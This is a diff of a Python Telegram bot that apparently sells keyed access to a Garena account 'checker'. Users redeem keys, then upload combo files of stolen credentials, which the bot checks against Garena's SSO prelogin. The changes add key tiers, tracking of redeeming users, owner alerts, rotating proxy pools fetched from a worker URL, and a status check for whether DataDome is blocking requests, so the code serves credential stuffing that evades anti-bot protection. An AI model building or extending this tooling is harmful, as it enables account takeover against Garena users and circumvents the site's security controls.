             f"📅 <b>Created:</b> {created}\n"
             f"📅 <b>Expires:</b> {exp_dt}\n"
-            f"👥 <b>Slots:</b> {slots_used}/{slots_max} used\n"
-            f"📦 <b>Limit/user:</b> {limit_disp} lines\n"
+            f"📦 <b>Combo Limit:</b> {combo_disp}\n"
+            f"👥 <b>Max Redemptions:</b> {slots_used}/{slots_max} used\n"
+            f"📡 <b>Source:</b> {source}\n"
+            f"🆔 <b>Key ID:</b> <code>{e.get('api_id', 'N/A')}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"👤 <b>Users redeemed:</b>\n{users_list}"
         )
         return
 
-    # Show summary of all keys
-    total   = len(keys)
-    active  = [k for k, v in keys.items() if now < v.get("expires", 0)]
-    expired = [k for k, v in keys.items() if now >= v.get("expires", 0)]
+    # Show summary of all keys — same layout as KeyVault dashboard stats
+    total    = len(keys)
+    active   = [k for k, v in keys.items() if now < v.get("expires", 0) and not v.get("revoked")]
+    expired  = [k for k, v in keys.items() if now >= v.get("expires", 0) and not v.get("revoked")]
+    revoked  = [k for k, v in keys.items() if v.get("revoked")]
 
     def _used_count(v):
         ub = v.get("used_by", [])
         if isinstance(ub, str): return 1 if ub else 0
+        if isinstance(ub, dict): return 1  # single dict entry
         return len(ub)
 
-    unused  = [k for k, v in keys.items() if _used_count(v) == 0]
-
     lines = [
-        f"📋 <b>Key Status Overview</b>\n"
+        f"📋 <b>Key Status — Dashboard</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔢 <b>Total:</b> {total}  |  ✅ Active: {len(active)}  |  ❌ Expired: {len(expired)}\n"
-        f"🆓 <b>Unused:</b> {len(unused)}\n"
+        f"🔢 <b>Total:</b> {total}  |  ✅ Active: {len(active)}  |  ❌ Expired: {len(expired)}  |  🚫 Revoked: {len(revoked)}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     ]
 
@@ -4357,10 +6799,42 @@ def _handle_status_key(token: str, chat_id, from_user: dict, args: str):
             rem        = max(0, int(v.get("expires", 0) - now))
             used_cnt   = _used_count(v)
             max_u      = v.get("max_users", 1)
-            slots      = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
-            lim        = "∞" if v.get("combo_limit") == 0 else str(v.get("combo_limit", 500))
-            lines.append(f"  <code>{k}</code>\n  ⏳ {_dur_label(rem)} · 👥 {slots} · 📦 {lim}")
+            redeems    = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
+            combo      = "∞" if v.get("combo_limit") == 0 else str(v.get("combo_limit", 1000))
+            tier_badge = "⭐" if v.get("tier") == "vip" else "🆓"
+            label      = v.get("label", "")
+            label_str  = f" · {label}" if label else ""
+            # Build usernames list for this key
+            ub = v.get("used_by", [])
+            if isinstance(ub, str): ub = [ub] if ub else []
+            if isinstance(ub, dict): ub = [ub]
+            key_users = []
+            for u in ub:
+                if isinstance(u, dict):
+                    un = u.get("username", "")
+                    nm = u.get("name", "")
+                    uid = u.get("id", u.get("tg_id", ""))
+                    # Check active status
+                    u_cid = None
+                    try: u_cid = int(uid)
+                    except (ValueError, TypeError): pass
+                    is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
+                    badge = "🟢" if is_on else "⚫"
+                    key_users.append(f"{badge} {f'@'+un if un else nm or uid}")
+                else:
+                    profile = _get_saved_profile(u)
+                    pn = profile.get("username", "") if profile else ""
+                    u_cid = None
+                    try: u_cid = int(u)
+                    except (ValueError, TypeError): pass
+                    is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
+                    badge = "🟢" if is_on else "⚫"
+                    key_users.append(f"{badge} {f'@'+pn if pn else u}")
+            users_str = " · ".join(key_users) if key_users else ""
+            users_line = f"\n  👤 {users_str}" if users_str else ""
+            lines.append(f"  {tier_badge} <code>{k[:20]}{'…' if len(k) > 20 else ''}</code>{label_str}\n  ⏳ {_dur_label(rem)} · 👥 {redeems} · 📦 {combo}{users_line}")
         if len(active) > 10:
+            lines.append(f"  <i>...and {len(active)-10} more</i>")
             lines.append(f"  <i>...and {len(active)-10} more</i>")
 
     if expired:
@@ -4369,12 +6843,57 @@ def _handle_status_key(token: str, chat_id, from_user: dict, args: str):
             v        = keys[k]
             used_cnt = _used_count(v)
             max_u    = v.get("max_users", 1)
-            slots    = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
-            lines.append(f"  <code>{k}</code> — 👥 {slots}")
+            redeems  = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
+            tier_badge = "⭐" if v.get("tier") == "vip" else "🆓"
+            lines.append(f"  {tier_badge} <code>{k[:20]}{'…' if len(k) > 20 else ''}</code> — 👥 {redeems}")
         if len(expired) > 5:
             lines.append(f"  <i>...and {len(expired)-5} more</i>")
 
-    lines.append(f"\n<i>Use /deletekey to remove keys</i>")
+    if revoked:
+        lines.append("\n🚫 <b>Revoked Keys:</b>")
+        for k in revoked[:5]:
+            v = keys[k]
+            tier_badge = "⭐" if v.get("tier") == "vip" else "🆓"
+            lines.append(f"  {tier_badge} <code>{k[:20]}{'…' if len(k) > 20 else ''}</code>")
+        if len(revoked) > 5:
+            lines.append(f"  <i>...and {len(revoked)-5} more</i>")
+
+    # ── Active Users Overview ────────────────────────────────────
+    all_key_users = []  # (name, username, id, is_active)
+    for k, v in keys.items():
+        ub = v.get("used_by", [])
+        if isinstance(ub, str): ub = [ub] if ub else []
+        if isinstance(ub, dict): ub = [ub]
+        for u in ub:
+            if isinstance(u, dict):
+                uid = u.get("id", u.get("tg_id", ""))
+                u_cid = None
+                try: u_cid = int(uid)
+                except (ValueError, TypeError): pass
+                is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
+                all_key_users.append((u.get("name", ""), u.get("username", ""), uid, is_on))
+            else:
+                profile = _get_saved_profile(u)
+                pn = profile.get("username", "") if profile else ""
+                nm = profile.get("username", "") if profile else ""
+                u_cid = None
+                try: u_cid = int(u)
+                except (ValueError, TypeError): pass
+                is_on = u_cid and u_cid in _bot_state and _bot_state[u_cid] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
+                all_key_users.append((nm, pn, u, is_on))
+    if all_key_users:
+        online_count = sum(1 for _, _, _, on in all_key_users if on)
+        total_count = len(all_key_users)
+        lines.append(f"\n👥 <b>Key Users:</b> {online_count}/{total_count} online")
+        for nm, un, uid, on in all_key_users[:15]:
+            badge = "🟢" if on else "⚫"
+            status = "1/1" if on else "0/1"
+            name_part = f"@{un}" if un else nm or str(uid)
+            lines.append(f"  {badge} {name_part} ─ <code>{uid}</code> [{status}]")
+        if len(all_key_users) > 15:
+            lines.append(f"  <i>...and {len(all_key_users)-15} more</i>")
+
+    lines.append(f"\n<i>Use /statuskey KEY for details · /deletekey to remove</i>")
     _tg_send(token, chat_id, "\n".join(lines))
 
 
@@ -4433,6 +6952,14 @@ def _deletekey_header(keys: dict, selected: set, now: float) -> str:
     )
 
 
+def _delete_key_from_api(entry: dict):
+    """If a key was created via the API, also delete it from KeyVault."""
+    api = _get_keysystem_api()
+    api_id = entry.get("api_id")
+    if api.enabled and api_id:
+        api.delete_key(api_id)
+
+
 def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
     if not _is_owner(from_user):
         _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
@@ -4453,7 +6980,9 @@ def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
             if not to_del:
                 _tg_send(token, chat_id, "✅ No expired keys to delete.")
                 return
-            for k in to_del: del keys[k]
+            for k in to_del:
+                _delete_key_from_api(keys[k])
+                del keys[k]
             _save_keys(keys)
             _tg_send(token, chat_id,
                 f"🗑 <b>Deleted {len(to_del)} expired key(s).</b>\n"
@@ -4464,7 +6993,9 @@ def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
             if not to_del:
                 _tg_send(token, chat_id, "✅ No unused keys to delete.")
                 return
-            for k in to_del: del keys[k]
+            for k in to_del:
+                _delete_key_from_api(keys[k])
+                del keys[k]
             _save_keys(keys)
             _tg_send(token, chat_id,
                 f"🗑 <b>Deleted {len(to_del)} unused key(s).</b>\n"
@@ -4472,6 +7003,8 @@ def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
             return
         if args.lower() == "all":
             count = len(keys)
+            for entry in keys.values():
+                _delete_key_from_api(entry)
             keys.clear()
             _save_keys(keys)
             _deletekey_selection.pop(chat_id, None)
@@ -4483,6 +7016,7 @@ def _handle_delete_key(token: str, chat_id, from_user: dict, args: str):
             _tg_send(token, chat_id, f"❌ Key <code>{target}</code> not found.")
             return
         entry = keys.pop(target)
+        _delete_key_from_api(entry)
         _save_keys(keys)
         exp_dt = datetime.fromtimestamp(entry.get("expires", 0)).strftime("%Y-%m-%d %H:%M")
         used   = entry.get("used_by") or "never used"
@@ -4519,14 +7053,69 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
     keys    = _load_keys()
     now     = time.time()
     uid_str = str(chat_id)
+    api     = _get_keysystem_api()
 
+    # ── Check local store first ─────────────────────────────────
     if key not in keys:
-        _tg_send_buttons(token, chat_id,
-            "❌ <b>Invalid key.</b>\n\n"
-            "Please check the key and try again.",
-            [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
-        )
-        return
+        # Try case-insensitive match (API keys may be mixed case)
+        key_lower = key_arg.strip().lower()
+        matched = None
+        for k in keys:
+            if k.lower() == key_lower:
+                matched = k
+                break
+        if matched:
+            key = matched
+        elif api.enabled:
+            # Key not found locally — try validating via KeyVault API
+            api_result = api.validate_key(key_arg.strip())
+            if not api_result:
+                # Also try the original case
+                api_result = api.validate_key(key)
+            if api_result and api_result.get("valid"):
+                # Key is valid in API — create local entry for user tracking
+                api_key_info = api_result.get("key", {})
+                expires_at = api_key_info.get("expiresAt")
+                if expires_at:
+                    expires = expires_at / 1000.0  # API uses milliseconds
+                else:
+                    expires = now + 86400 * 30  # default 30 days if no expiry
+                rate_limit = api_key_info.get("rateLimit", "1000")
+                combo_limit = int(rate_limit) if rate_limit.isdigit() else 0
+                max_redemptions = api_key_info.get("maxRedemptions")
+                max_users = max_redemptions if max_redemptions else 0
+                keys[key] = {
+                    "expires":     expires,
+                    "combo_limit": combo_limit,
+                    "max_users":   max_users,
+                    "used_by":     [],
+                    "created":     now,
+                    "api_id":      api_key_info.get("id", ""),
+                    "source":      "keyvault",
+                }
+                _save_keys(keys)
+            elif api_result and not api_result.get("valid"):
+                reason = api_result.get("reason", "Invalid key")
+                _tg_send_buttons(token, chat_id,
+                    f"❌ <b>{reason}</b>\n\n"
+                    "Please check the key and try again.",
+                    [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
+                )
+                return
+            else:
+                _tg_send_buttons(token, chat_id,
+                    "❌ <b>Invalid key.</b>\n\n"
+                    "Please check the key and try again.",
+                    [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
+                )
+                return
+        else:
+            _tg_send_buttons(token, chat_id,
+                "❌ <b>Invalid key.</b>\n\n"
+                "Please check the key and try again.",
+                [[{"text": "🔄 Try again", "callback_data": "redeem:prompt"}]]
+            )
+            return
 
     entry = keys[key]
 
@@ -4546,19 +7135,30 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
     max_users = entry.get("max_users", 1)   # 0 = unlimited
 
     # ── Already redeemed by this user → refresh + re-ask setup ─
-    if uid_str in used_by:
+    # Support both legacy (string) and new (dict) used_by entries
+    user_already_redeemed = False
+    for u in used_by:
+        if isinstance(u, dict) and str(u.get("id", "")) == uid_str:
+            user_already_redeemed = True
+            break
+        elif isinstance(u, str) and u == uid_str:
+            user_already_redeemed = True
+            break
+    if user_already_redeemed:
         d = _udata(chat_id)
         d["key"]         = key
         d["key_expires"] = entry["expires"]
         d["combo_limit"] = entry.get("combo_limit", 500)
+        d["key_tier"]    = entry.get("tier", "free")
         _save_profile(chat_id, d)
         remaining  = int(entry["expires"] - now)
         hrs  = remaining // 3600
         mins = (remaining % 3600) // 60
         slots_max = "∞" if max_users == 0 else str(max_users)
         _tg_send(token, chat_id,
-            f"✅ <b>Access Restored!</b> ⭐ VIP\n\n"
+            f"✅ <b>Access Restored!</b> {'⭐ VIP (no queue)' if entry.get('tier', 'free') == 'vip' else '🆓 Free (queued)'}\n\n"
             f"🔑 <b>Key:</b> <code>{key}</code>\n"
+            f"🆔 <b>Your ID:</b> <code>{from_user.get('id', chat_id)}</code>\n"
             f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
             f"👥 <b>Slots:</b> {len(used_by)}/{slots_max}\n"
             f"📦 <b>Combo limit:</b> ∞ Unlimited\n\n"
@@ -4575,8 +7175,28 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
             f"Ask the owner for a new key.")
         return
 
-    # ── Add this user ──────────────────────────────────────────
-    used_by.append(uid_str)
+    # ── Add this user ──────────────────────────────────────────────────
+    # Store rich user info: {id, name, username} instead of just chat_id
+    user_name     = from_user.get("first_name", "")
+    user_lastname = from_user.get("last_name", "")
+    if user_lastname:
+        user_name += f" {user_lastname}"
+    user_username = from_user.get("username", "")
+    user_tg_id    = from_user.get("id", chat_id)
+
+    # Check if this user (by id) is already in used_by to avoid duplicates
+    already_index = None
+    for idx, u in enumerate(used_by):
+        uid_check = u if isinstance(u, str) else str(u.get("id", ""))
+        if uid_check == uid_str:
+            already_index = idx
+            break
+
+    user_entry = {"id": uid_str, "name": user_name, "username": user_username, "tg_id": user_tg_id}
+    if already_index is not None:
+        used_by[already_index] = user_entry  # update with richer info
+    else:
+        used_by.append(user_entry)
     entry["used_by"] = used_by
     _save_keys(keys)
 
@@ -4584,6 +7204,7 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
     d["key"]         = key
     d["key_expires"] = entry["expires"]
     d["combo_limit"] = entry.get("combo_limit", 500)
+    d["key_tier"]    = entry.get("tier", "free")
     _save_profile(chat_id, d)
 
     remaining  = int(entry["expires"] - now)
@@ -4593,16 +7214,34 @@ def _handle_redeem(token: str, chat_id, from_user: dict, key_arg: str):
     slots_max  = "∞" if max_users == 0 else str(max_users)
 
     # ── Success message ────────────────────────────────────────
+    # ── Success message ──────────────────────────────────────────────────
     _tg_send(token, chat_id,
-        f"✅ <b>Key Redeemed Successfully!</b> ⭐ VIP\n\n"
+        f"✅ <b>Key Redeemed Successfully!</b> {'⭐ VIP (no queue)' if entry.get('tier', 'free') == 'vip' else '🆓 Free (queued)'}\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🔑 <b>Key:</b> <code>{key}</code>\n"
+        f"🆔 <b>Your ID:</b> <code>{user_tg_id}</code>\n"
+        f"👤 <b>Name:</b> {user_name or 'Unknown'}{' @' + user_username if user_username else ''}\n"
         f"⏳ <b>Valid for:</b> {hrs}h {mins}m\n"
         f"👥 <b>Slots:</b> {slots_used}/{slots_max} used\n"
         f"📦 <b>Combo limit:</b> ∞ Unlimited\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"<i>Now set up your preferences below 👇</i>"
     )
+
+    # ── Notify the owner about the redemption ──────────────────────────
+    try:
+        owner_msg_name = user_name or "Unknown"
+        owner_msg_user = f" @{user_username}" if user_username else ""
+        owner_msg_id   = user_tg_id
+        _tg_send(token, OWNER_ID,
+            f"🔑 <b>Key Redeemed!</b>\n\n"
+            f"👤 <b>User:</b> {owner_msg_name}{owner_msg_user}\n"
+            f"🆔 <b>ID:</b> <code>{owner_msg_id}</code>\n"
+            f"🔑 <b>Key:</b> <code>{key[:20]}{'…' if len(key) > 20 else ''}</code>\n"
+            f"📊 <b>Slots:</b> {slots_used}/{slots_max} used"
+        )
+    except Exception:
+        pass  # don't fail redeem if owner notification fails
 
     # ── Immediately show level picker ──────────────────────────
     _ask_level(token, chat_id)
@@ -4612,6 +7251,29 @@ def _check_access(token: str, chat_id, from_user: dict) -> bool:
     """Returns True if user is allowed to use the checker."""
     if _is_owner(from_user):
         return True
+
+    # ── Maintenance mode: no proxies available ──────────────────
+    if not _has_proxies():
+        _notify_no_proxy(token, chat_id, from_user)
+        # Check if user already has a paused session
+        already_paused = False
+        with _proxy_paused_lock:
+            if str(chat_id) in _proxy_paused_users:
+                already_paused = True
+        if already_paused:
+            _tg_send(token, chat_id,
+                "⏳ <b>Still waiting for proxies...</b>\n\n"
+                "Your check will auto-resume as soon as proxies are available.\n\n"
+                "<i>Thank you for your patience.</i>"
+            )
+        else:
+            _tg_send(token, chat_id,
+                "🔧 <b>Bot Under Maintenance</b>\n\n"
+                "No proxies available right now.\n"
+                "Upload your combo file and your check will auto-resume when proxies are back!\n\n"
+                "<i>Thank you for your patience.</i>"
+            )
+        return False
 
     uid_str = str(chat_id)
     d = _udata(chat_id)
@@ -4629,6 +7291,7 @@ def _check_access(token: str, chat_id, from_user: dict) -> bool:
             d["key"]         = saved["key"]
             d["key_expires"] = saved["key_expires"]
             d["combo_limit"] = saved.get("combo_limit", 500)
+            d["key_tier"]    = saved.get("key_tier", "free")
             return True
 
     _tg_send(token, chat_id,
@@ -4898,6 +7561,12 @@ def _save_proxies_from_lines(raw_lines: list) -> tuple:
     except Exception:
         pass
 
+    # ── Persist to saved_proxies/ + KeyVault API ──
+    try:
+        _persist_proxies()
+    except Exception:
+        pass
+
     return len(new_proxies), skipped, save_path
 
 
@@ -5101,8 +7770,17 @@ def _handle_proxy_upload(token: str, chat_id, from_user: dict, message: dict):
     try:
         geo_rotator._load_all_files()
         total_now = geo_rotator.total
+        # Clear any stale "no proxy" warning now that pool is loaded
+        if total_now > 0:
+            _clear_no_proxy_warning()
     except Exception:
         total_now = valid_count
+
+    # ── Persist to saved_proxies/ + KeyVault API ──
+    try:
+        _persist_proxies()
+    except Exception:
+        pass
 
     rename_note = (
         f"\n📝 <b>Renamed:</b> <code>{file_name}</code> → <code>{saved_name}</code>"
@@ -5124,38 +7802,445 @@ def _handle_proxy_upload(token: str, chat_id, from_user: dict, message: dict):
 
 
 def _handle_proxy_status(token: str, chat_id, from_user: dict):
-    """Show current proxy files and counts."""
+    """Show current proxy pool status, HTTP/SOCKS5 breakdown, DataDome, connectivity, and auto-fetch info."""
     if not _is_owner(from_user):
         _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
         return
 
     files = _get_proxy_files()
+    pool_size = geo_rotator.total
+    
+    # ── Proxy file listing ──
     if not files:
-        _tg_send(token, chat_id,
-            "📡 <b>Proxy Files</b>\n\n"
-            "<i>No proxy files found in proxy/ folder.</i>\n\n"
-            "Use <code>/upload_proxy</code> to upload one.")
+        file_info = "<i>No proxy files found in proxy/ folder.</i>\n\n"
+        file_info += "Use <code>/upload_proxy</code> to upload one.\n"
+        file_info += f"Free proxies are auto-fetched every {RAW_PROXY_FETCH_INTERVAL}s."
+    else:
+        lines_out = []
+        total = 0
+        for fpath in files:
+            fname = os.path.basename(fpath)
+            try:
+                size_kb = os.path.getsize(fpath) / 1024
+                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
+                    count = sum(1 for l in f if l.strip() and not l.startswith("#") and ":" in l)
+            except Exception:
+                count, size_kb = 0, 0
+            total += count
+            lines_out.append(f"  📄 {fname}\n  📊 {count:,} proxies · {size_kb:.1f}KB")
+        body = "\n\n".join(lines_out)
+        file_info = f"{body}\n\n🔢 <b>Total: {total:,} in {len(files)} file(s)</b>"
+    
+    # ── DataDome status ──
+    dd_status = "❌ No cookie"
+    dd = None
+    # Try to get DD from any active checker's datadome_manager
+    for cid, bar_data in _active_bars.items():
+        ls = bar_data.get("live_stats")
+        if ls and hasattr(ls, '_datadome_manager') and ls._datadome_manager:
+            dd = ls._datadome_manager.get_datadome()
+            break
+    if dd:
+        dd_status = f"✅ <code>{dd[:30]}...</code>"
+    
+    # ── Quick connectivity check ──
+    conn_status = "⏳ Checking..."
+    try:
+        resp = requests.get(
+            "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
+            timeout=8, allow_redirects=False
+        )
+        if resp.status_code == 200:
+            conn_status = "✅ Direct OK (no block)"
+        elif resp.status_code == 403:
+            conn_status = "🛡️ DataDome blocked (need proxies!)"
+        else:
+            conn_status = f"⚠️ HTTP {resp.status_code}"
+    except Exception:
+        conn_status = "❌ Cannot reach Garena"
+    
+    # ── SOCKS5 count ──
+    socks_count = sum(1 for p in geo_rotator._proxies if p.lower().startswith(("socks5", "socks4", "socks5h")))
+    http_count = pool_size - socks_count
+    
+    _tg_send(token, chat_id,
+        f"📡 <b>Proxy Status</b>\n\n"
+        f"{file_info}\n\n"
+        f"🏊 <b>Pool:</b> {pool_size:,} proxies\n"
+        f"🔄 Auto-fetch: every {RAW_PROXY_FETCH_INTERVAL}s from {len(RAW_PROXY_SOURCES)} source(s)\n"
+        f"  🌐 HTTP: {http_count:,} · 🔒 SOCKS5: {socks_count:,}\n\n"
+        f"🍪 <b>DataDome:</b> {dd_status}\n\n"
+        f"🔗 <b>Garena SSO:</b> {conn_status}"
+    )
+
+
+def _handle_delete_proxy(token: str, chat_id, from_user: dict):
+    """Delete the raw_fetched_proxies.txt file and clear the proxy pool.
+    Owner-only command — removes all auto-fetched proxies so they can be refreshed cleanly."""
+    if not _is_owner(from_user):
+        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
         return
 
-    lines_out = []
-    total = 0
-    for fpath in files:
-        fname = os.path.basename(fpath)
-        try:
-            size_kb = os.path.getsize(fpath) / 1024
-            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
-                count = sum(1 for l in f if l.strip() and not l.startswith("#") and ":" in l)
-        except Exception:
-            count, size_kb = 0, 0
-        total += count
-        lines_out.append(f"  📄 {fname}\n  📊 {count:,} proxies · {size_kb:.1f}KB")
+    log = logging.getLogger(__name__)
+    deleted_files = []
+    deleted_count = 0
 
-    body = "\n\n".join(lines_out)
+    # Delete raw_fetched_proxies.txt
+    if os.path.exists(RAW_PROXY_SAVE_FILE):
+        try:
+            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
+            deleted_count = len(lines)
+            os.remove(RAW_PROXY_SAVE_FILE)
+            deleted_files.append(f"raw_fetched_proxies.txt ({deleted_count} proxies)")
+            log.info(f"[DELETE-PROXY] Deleted {RAW_PROXY_SAVE_FILE} ({deleted_count} proxies)")
+        except Exception as e:
+            log.error(f"[DELETE-PROXY] Failed to delete {RAW_PROXY_SAVE_FILE}: {e}")
+            _tg_send(token, chat_id, f"❌ <b>Failed to delete proxy file:</b> <code>{e}</code>")
+            return
+    else:
+        deleted_files.append("raw_fetched_proxies.txt (not found — already deleted)")
+
+    # Also delete pasted_proxies.txt if it exists
+    pasted_path = os.path.join(PROXY_FOLDER, "pasted_proxies.txt")
+    if os.path.exists(pasted_path):
+        try:
+            with open(pasted_path, "r", encoding="utf-8", errors="ignore") as f:
+                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
+            pasted_count = len(lines)
+            os.remove(pasted_path)
+            deleted_files.append(f"pasted_proxies.txt ({pasted_count} proxies)")
+            deleted_count += pasted_count
+            log.info(f"[DELETE-PROXY] Deleted {pasted_path} ({pasted_count} proxies)")
+        except Exception as e:
+            log.error(f"[DELETE-PROXY] Failed to delete {pasted_path}: {e}")
+
+    # Clear the in-memory proxy pool and reload (will be empty now)
+    try:
+        with geo_rotator._lock:
+            geo_rotator._proxies = []
+            geo_rotator._proxy_source = {}
+            geo_rotator._thread_idx = {}
+            geo_rotator._thread_proxy = {}
+            geo_rotator._global_idx = 0
+        geo_rotator._load_all_files()
+    except Exception as e:
+        log.error(f"[DELETE-PROXY] Failed to clear pool: {e}")
+
+    # Also clean saved_proxies/ mirror
+    try:
+        for fname in ["raw_fetched_proxies.txt", "pasted_proxies.txt"]:
+            sp = os.path.join(SAVED_PROXIES_DIR, fname)
+            if os.path.exists(sp):
+                os.remove(sp)
+    except Exception:
+        pass
+
+    pool_now = geo_rotator.total
+    files_str = "\n".join(f"  🗑️ {f}" for f in deleted_files)
+
     _tg_send(token, chat_id,
-        f"📡 <b>Proxy Files</b>\n\n"
-        f"{body}\n\n"
-        f"🔢 <b>Total: {total:,} in {len(files)} file(s)</b>"
+        f"🗑️ <b>Proxy Files Deleted!</b>\n\n"
+        f"{files_str}\n\n"
+        f"🧹 <b>Total proxies removed:</b> <code>{deleted_count}</code>\n"
+        f"📡 <b>Proxy pool now:</b> <code>{pool_now}</code>\n\n"
+        f"💡 Use <code>/renewproxy</code> to fetch fresh proxies from the worker."
     )
+
+
+def _handle_renew_proxy(token: str, chat_id, from_user: dict):
+    """Fetch fresh proxies from https://worker-production-a615.up.railway.app/ only.
+    DELETES the old raw_fetched_proxies.txt first (clean wipe), then fetches new
+    proxies from the worker source and reloads the pool."""
+    if not _is_owner(from_user):
+        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+        return
+
+    log = logging.getLogger(__name__)
+
+    _tg_send(token, chat_id, "🔄 <b>Renewing proxies from worker…</b>\n\n"
+        "⏳ Fetching fresh proxies from:\n"
+        "<code>https://worker-production-a615.up.railway.app/</code>\n\n"
+        "🗑️ Wiping old proxy files first…")
+
+    # Step 1: DELETE old raw_fetched_proxies.txt completely
+    old_count = 0
+    if os.path.exists(RAW_PROXY_SAVE_FILE):
+        try:
+            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                old_count = sum(1 for l in f if l.strip() and not l.strip().startswith("#"))
+            os.remove(RAW_PROXY_SAVE_FILE)
+            log.info(f"[RENEW-PROXY] Deleted old {RAW_PROXY_SAVE_FILE} ({old_count} proxies)")
+        except Exception as e:
+            log.error(f"[RENEW-PROXY] Failed to delete old file: {e}")
+
+    # Step 2: Also delete pasted_proxies.txt
+    pasted_path = os.path.join(PROXY_FOLDER, "pasted_proxies.txt")
+    if os.path.exists(pasted_path):
+        try:
+            os.remove(pasted_path)
+            log.info(f"[RENEW-PROXY] Deleted old {pasted_path}")
+        except Exception as e:
+            log.error(f"[RENEW-PROXY] Failed to delete {pasted_path}: {e}")
+
+    # Step 3: Delete ALL other proxy .txt files in proxy/ folder
+    # This ensures no stale proxies remain from any source
+    try:
+        if os.path.exists(PROXY_FOLDER):
+            for fname in os.listdir(PROXY_FOLDER):
+                if fname.endswith(".txt"):
+                    fpath = os.path.join(PROXY_FOLDER, fname)
+                    try:
+                        os.remove(fpath)
+                        log.info(f"[RENEW-PROXY] Deleted {fpath}")
+                    except Exception as e:
+                        log.error(f"[RENEW-PROXY] Failed to delete {fpath}: {e}")
+    except Exception as e:
+        log.error(f"[RENEW-PROXY] Failed to scan proxy folder: {e}")
+
+    # Step 4: Clear in-memory pool so old proxies don't persist
+    try:
+        with geo_rotator._lock:
+            geo_rotator._proxies = []
+            geo_rotator._proxy_source = {}
+            geo_rotator._thread_idx = {}
+            geo_rotator._thread_proxy = {}
+            geo_rotator._global_idx = 0
+    except Exception as e:
+        log.error(f"[RENEW-PROXY] Failed to clear in-memory pool: {e}")
+
+    # Also clean saved_proxies/ mirror
+    try:
+        if os.path.exists(SAVED_PROXIES_DIR):
+            for fname in os.listdir(SAVED_PROXIES_DIR):
+                if fname.endswith(".txt"):
+                    sp = os.path.join(SAVED_PROXIES_DIR, fname)
+                    try:
+                        os.remove(sp)
+                    except Exception:
+                        pass
+    except Exception:
+        pass
+
+    # Step 5: Fetch fresh proxies from the primary worker source ONLY
+    # Uses JSON format so we get proxy type info (http/socks4/socks5)
+    worker_url = "https://worker-production-a615.up.railway.app/?format=json"
+    new_proxies = []
+    fetch_errors = []
+    type_counts = {"http": 0, "socks4": 0, "socks5": 0}
+
+    try:
+        resp = requests.get(worker_url, timeout=30)
+        resp.raise_for_status()
+        data = resp.json()
+        proxy_items = data.get("proxies", [])
+        log.info(f"[RENEW-PROXY] Fetched {len(proxy_items)} proxies from worker (JSON format)")
+    except Exception as e:
+        proxy_items = []
+        fetch_errors.append(f"Worker fetch failed: {e}")
+        log.error(f"[RENEW-PROXY] Failed to fetch from worker: {e}")
+
+    # Step 6: Normalize using type info from JSON, deduplicate, write to fresh file
+    if proxy_items:
+        os.makedirs(PROXY_FOLDER, exist_ok=True)
+
+        # Create FRESH raw_fetched_proxies.txt (not append!)
+        with open(RAW_PROXY_SAVE_FILE, "w", encoding="utf-8") as f:
+            f.write("# Auto-fetched proxies — renewed from worker\n")
+
+        seen = set()
+        for item in proxy_items:
+            try:
+                raw_proxy = item.get("proxy", "").strip()
+                proxy_type = item.get("type", "").lower().strip()
+                if not raw_proxy or not proxy_type:
+                    continue
+                # Apply correct scheme based on type
+                if proxy_type in ("socks5", "socks5h"):
+                    scheme = "socks5h"
+                elif proxy_type == "socks4":
+                    scheme = "socks5h"
+                else:
+                    scheme = "http"
+                # Normalize bare ip:port with the correct scheme
+                parts = raw_proxy.split(":")
+                if len(parts) == 2 and parts[1].isdigit():
+                    normalized = f"{scheme}://{parts[0]}:{parts[1]}"
+                elif len(parts) == 4 and parts[1].isdigit():
+                    normalized = f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+                else:
+                    # Already has scheme or unusual format — use normalizer
+                    normalized = geo_rotator._normalize_proxy(raw_proxy)
+                if not normalized:
+                    continue
+                if normalized in seen:
+                    continue
+                seen.add(normalized)
+                new_proxies.append(normalized)
